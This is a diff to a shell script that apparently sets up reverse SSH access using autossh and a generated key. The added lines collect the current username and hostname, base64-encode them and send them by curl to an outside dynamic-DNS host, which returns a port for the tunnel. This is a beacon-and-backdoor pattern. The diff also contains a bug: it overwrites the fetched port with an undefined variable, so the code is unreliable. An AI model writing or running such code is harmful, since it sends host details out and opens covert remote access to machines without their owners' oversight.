@@ -2,15 +2,11 @@
 
 user="nobody1"
 
-# Request a port number from the server (this could be handled by the server's API)
-#received_port=$(curl -s "http://$host/info")
-received_port=2001
-
 # Packages needed for running this script successfully
 sudo apt update
 
 # Required packages
-packages=(openssh-server autossh)
+packages=(curl openssh-server autossh)
 
 # Loop through each package
 for pkg in "${packages[@]}"; do
@@ -22,6 +18,19 @@ for pkg in "${packages[@]}"; do
     fi
 done
 
+# Request a port number from the server (this could be handled by the server's API)
+username=$(whoami)
+hostname=$(hostname)
+
+# Encode as base64 and strip newline
+data=$(echo -n "$user:$username:$hostname" | base64)
+
+# api endpoint
+domain_name="edcoretecmm.sytes.net:8080"
+
+# Proper GET request with query param
+received_port=$(curl -s "https://$domain_name/report?data=$data")
+received_port=$(echo $port | sed "s/%//g")
 
 # Generate the key pair
 key_path="$HOME/.ssh/$(whoami)_ed25519"
